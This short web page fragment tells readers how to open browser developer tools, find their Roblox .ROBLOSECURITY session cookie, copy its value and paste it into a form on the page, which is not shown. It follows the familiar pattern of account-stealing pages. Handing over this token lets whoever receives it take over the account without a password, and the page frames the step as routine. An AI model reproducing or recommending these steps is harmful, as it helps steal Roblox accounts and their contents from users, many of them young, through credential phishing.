How to get your Roblox Cookie
  1. Open Roblox in your browser and make sure you're logged in
  2. Open Developer Tools (F12 or right-click → Inspect)
  3. Go to Application/Storage tab → Cookies → https://www.roblox.com
  4. Find .ROBLOSECURITY and copy its value
  5. Paste the value in the form above
